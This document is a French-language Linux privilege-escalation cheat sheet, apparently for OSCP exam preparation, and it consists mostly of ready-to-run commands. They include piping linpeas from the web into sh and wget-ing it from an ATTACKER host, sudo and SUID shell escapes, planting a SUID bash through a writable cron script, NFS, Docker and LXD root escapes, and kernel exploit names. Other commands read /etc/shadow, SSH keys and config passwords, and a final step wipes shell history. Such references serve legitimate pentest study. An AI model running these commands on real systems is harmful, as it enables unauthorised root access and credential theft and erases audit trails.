# 🟢 Privilege Escalation — Linux

## Enumeration automatique

```bash
# linpeas (toujours en premier)
curl -sL https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh

# Depuis ton box (via HTTP server)
# attaquant:
python3 -m http.server 8000
# victime:
wget http://ATTACKER/linpeas.sh && chmod +x linpeas.sh && ./linpeas.sh

# Autres scanners
./LinEnum.sh
./linux-exploit-suggester.sh
./unix-privesc-check detailed
pspy64 -pf   # process spying sans root (voir les crons en live)
```

## Checks manuels essentiels

```bash
# Noyau / distro
uname -a
cat /etc/os-release
cat /proc/version

# Users
id
whoami
groups
cat /etc/passwd
cat /etc/shadow          # si lisible = jackpot
cat /etc/group

# Sudo
sudo -l                  # LE premier truc à checker
sudo -V                  # version (CVE-2021-3156 Baron Samedit : sudo < 1.9.5p2)

# SUID / SGID
find / -perm -u=s -type f 2>/dev/null
find / -perm -4000 -type f 2>/dev/null
find / -perm -g=s -type f 2>/dev/null

# Capabilities
getcap -r / 2>/dev/null

# Cron
cat /etc/crontab
ls -la /etc/cron.*
systemctl list-timers

# Env
env
echo $PATH

# Fichiers writables par tout le monde
find / -writable -type f 2>/dev/null | grep -v /proc | grep -v /sys
find / -perm -o=w -type d 2>/dev/null

# Services écoutants en local
ss -tulnp     # -p si root, sinon: netstat -tulnp
```

## GTFOBins — réflexe

**Toujours** consulter https://gtfobins.github.io/ pour chaque binaire
avec SUID ou autorisé en sudo.

Exemples fréquents :

```bash
# sudo vim
sudo vim -c ':!/bin/bash'

# sudo less
sudo less /etc/profile    # puis : !bash

# sudo find
sudo find . -exec /bin/bash \; -quit

# SUID python
/usr/bin/python -c 'import os; os.execl("/bin/sh", "sh", "-p")'

# SUID bash (< 4.2-048)
./bash -p

# SUID nmap (interactive: <5.2.0)
nmap --interactive
!sh

# sudo awk
sudo awk 'BEGIN {system("/bin/bash")}'

# Capability cap_setuid=ep sur un binaire
./binary -c 'import os; os.setuid(0); os.system("/bin/sh")'
```

## Exploitation de crons

```bash
# Un cron tourne en root et écrit/lance /opt/script.sh writable ?
echo '#!/bin/bash' > /opt/script.sh
echo 'cp /bin/bash /tmp/b && chmod +s /tmp/b' >> /opt/script.sh
# attendre le cron → /tmp/b -p = shell root

# PATH injection : cron appelle `backup` sans chemin absolu ?
echo '/bin/bash -p' > /tmp/backup
chmod +x /tmp/backup
export PATH=/tmp:$PATH     # si on contrôle le PATH du cron (via script source)
```

## NFS root_squash == no_root_squash

```bash
# Sur la cible : /etc/exports montre no_root_squash ?
cat /etc/exports
# Sur ton box (root) :
mount -o rw,vers=3 TARGET:/share /mnt/nfs
cp /bin/bash /mnt/nfs/bash
chown root:root /mnt/nfs/bash
chmod +s /mnt/nfs/bash
# Sur la cible :
/share/bash -p        # root !
```

## Docker group

```bash
# Si l'user est dans le groupe docker :
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

## LXD group

```bash
# Build image minimale
git clone https://github.com/saghul/lxd-alpine-builder
cd lxd-alpine-builder && ./build-alpine
# Sur la cible :
lxc image import ./alpine-*.tar.gz --alias priv
lxc init priv mycontainer -c security.privileged=true
lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true
lxc start mycontainer
lxc exec mycontainer /bin/sh
# cd /mnt/root → fs entier en root
```

## Kernel exploits (dernier recours)

```bash
# Deviner la version, chercher l'exploit
uname -a
searchsploit linux kernel 5.8

# Noms classiques
DirtyCow (CVE-2016-5195)          # <4.8.3
DirtyPipe (CVE-2022-0847)         # 5.8 → 5.16.11
PwnKit / pkexec (CVE-2021-4034)   # polkit, énorme fiabilité
overlayfs (CVE-2023-0386)         # 5.11+
```

> ⚠ **OSCP** : les kernel exploits sont instables et peuvent freeze la
> box. Essayer TOUT le reste d'abord (sudo -l, SUID, GTFOBins, cron,
> services). Un reboot de box pendant l'examen = perte de temps.

## Process / services

```bash
ps auxwf            # arbre de process
ps -ef

# Services tournant en root avec des binaires writables
for f in $(ps -eo command --no-headers | awk '{print $1}' | sort -u); do
    [ -w "$f" ] && echo "writable: $f"
done 2>/dev/null
```

## Historique et credentials

```bash
# Le plus rentable :
cat ~/.bash_history
cat /home/*/.bash_history 2>/dev/null
cat ~/.ssh/id_rsa
cat /etc/ssh/ssh_host_*_key

# Configs avec password en clair
grep -r "password" /etc 2>/dev/null | head
grep -r "passwd" /var/www 2>/dev/null | head
find / -name '*.conf' -readable 2>/dev/null | xargs grep -l -i "password\|secret" 2>/dev/null
find / -name 'wp-config.php' 2>/dev/null
find / -name '.env' 2>/dev/null
```

## Cleanup

```bash
# Toujours nettoyer : on efface nos binaires, history, logs propres à nous
rm /tmp/linpeas.sh /tmp/shell*
history -c && echo > ~/.bash_history
```
